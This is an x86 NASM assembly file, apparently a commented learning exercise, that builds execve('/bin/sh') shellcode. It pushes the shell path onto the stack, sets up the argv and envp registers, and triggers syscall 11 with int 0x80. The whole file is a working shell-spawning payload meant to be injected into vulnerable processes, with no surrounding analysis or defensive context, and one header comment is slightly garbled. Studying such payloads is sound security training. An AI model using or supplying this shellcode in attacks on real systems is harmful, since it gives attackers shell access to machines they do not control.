; this is the shellcode for /bin/sh using execve system call
;execve(const char *filename, char *const argv[],char *const envp[]);
; execve(/bin/sh['bin/sh'],[NULL)
;         EBX	 ECX	   EDX	




global _start

section .text

_start:


	xor eax, eax  

	push eax  ; push null byte (dword) to the stack
	
	push 0x68732f2f  ; hs// is pushed on to the stack
	push 0x6e69622f	 ; nib/ is pushed on to the stack

	mov ebx, esp     ; the address pointing to /bin/sh in stack is placed in ebx register


	push eax	 ; the NULL dword is pushed on to stack envp[]
	mov edx, esp     ; the address pointing to NULL dword in stack is placed in edx register
	
	
	push ebx	 ; the address which points to /bin/sh in ebx register is placed in stack
	mov ecx, esp 	 ; as the esp points to /bin/sh is then placed in ecx register, this is section argv['bin/sh'] check if address in stack is shown in ecx reg

	mov al, 11
	int 0x80
	

	

